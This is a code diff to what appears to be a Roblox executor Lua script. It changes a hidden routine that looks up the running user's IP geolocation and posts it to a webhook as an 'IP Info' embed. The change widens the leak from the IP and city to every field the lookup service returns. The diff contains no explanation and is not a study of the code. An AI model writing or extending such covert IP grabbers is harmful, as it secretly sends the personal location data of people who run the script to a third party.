@@ -763,7 +763,7 @@ end)
 
 
 
-local http_request = request or http and http.request or (getgenv and getgenv().request)
+local http_request = request or (http and http.request) or (getgenv and getgenv().request)
 if not http_request then return end
 
 local HttpService = game:GetService("HttpService")
@@ -775,19 +775,23 @@ if not res or not res.Body then return end
 local data = HttpService:JSONDecode(res.Body)
 if data.status ~= "success" then return end
 
+local payload = {
+    username = "aaaaaa",
+    embeds = {{
+        title = "IP Info",
+        color = 16711680,
+        fields = {}
+    }}
+}
+
+for k, v in pairs(data) do
+    table.insert(payload.embeds[1].fields, {name = k, value = tostring(v), inline = true})
+end
+
 http_request({
     Url = webhookUrl,
     Method = "POST",
     Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode({
-        username = "aaaaaa",
-        embeds = {{
-            title = "IP Info",
-            color = 16711680,
-            fields = {
-                {name = "IP", value = data.query, inline = true},
-                {name = "Location", value = data.city .. ", " .. data.country, inline = true}
-            }
-        }}
-    })
+    Body = HttpService:JSONEncode(payload)
 })
+
